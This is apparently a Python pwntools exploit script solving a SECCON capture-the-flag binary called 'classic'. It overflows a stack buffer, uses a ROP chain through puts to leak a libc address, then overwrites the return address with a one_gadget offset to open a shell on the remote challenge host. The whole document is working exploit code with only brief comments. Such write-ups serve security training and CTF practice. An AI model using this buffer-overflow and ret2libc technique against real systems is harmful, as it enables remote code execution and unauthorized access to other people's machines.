from pwn import *

context.arch = 'amd64'

e = ELF('./classic')
libc = ELF('./libc-2.23.so')
rop = ROP(e)
rop.raw(rop.rdi)                # pop rdi; ret;

r = remote('classic.pwn.seccon.jp', 17354)
r.recvuntil("Local Buffer >> ")

payload = ''
payload += 'A' * (0x40+8)       # dummy
payload += rop.chain()          # pop rdi; ret;
payload += p64(e.got.puts)      # puts@GOT
payload += p64(e.plt.puts+4)    # puts@plt
payload += p64(e.sym.main)      # loop
r.sendline(payload)

r.recvline()
PUTS_LIBC = u64(r.recvline().strip().ljust(8, '\0'))
libc.address = PUTS_LIBC - libc.sym.puts
log.success(hex(libc.address))  # leak

r.recvuntil("Local Buffer >> ")

payload = ''
payload += 'A' * (0x40+8)               # dummy
payload += p64(libc.address+0x45216)    # one_gadget
r.sendline(payload)

r.interactive()
# http://j3rrry.tistory.com/70
